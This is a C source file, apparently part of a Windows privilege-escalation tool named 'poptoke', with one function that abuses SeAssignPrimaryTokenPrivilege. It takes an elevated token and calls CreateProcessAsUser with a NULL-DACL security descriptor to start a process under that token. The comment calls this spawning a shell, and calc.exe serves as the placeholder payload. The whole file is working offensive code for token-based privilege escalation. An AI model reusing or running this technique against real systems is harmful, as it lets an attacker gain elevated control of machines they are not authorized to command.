#include "poptoke.h"

// Spawn a shell by using the SeAssignPrimaryTokenPrivilege, requires an elevated primary token
void
se_assign_primary_priv(HANDLE elevated_token)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	SECURITY_ATTRIBUTES sa = { 0 };
	SECURITY_DESCRIPTOR sdSecurityDescriptor;
	BOOL result;

	ZeroMemory(&si, sizeof(STARTUPINFO));
	ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	memset(&pi, 0x00, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(STARTUPINFO);

	if (!InitializeSecurityDescriptor(&sdSecurityDescriptor, SECURITY_DESCRIPTOR_REVISION))
		return;

	if (!SetSecurityDescriptorDacl(&sdSecurityDescriptor, TRUE, NULL, FALSE))
		return;

	sa.nLength = sizeof(sa);
	sa.lpSecurityDescriptor = &sdSecurityDescriptor;

	result = CreateProcessAsUser(elevated_token,
		L"C:\\Windows\\System32\\calc.exe",
		L"C:\\Windows\\System32\\calc.exe",
		&sa,
		&sa,
		FALSE,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi);

	if (!result){
		printf("[-] Failed to create proc: %d\n", GetLastError());
	}
}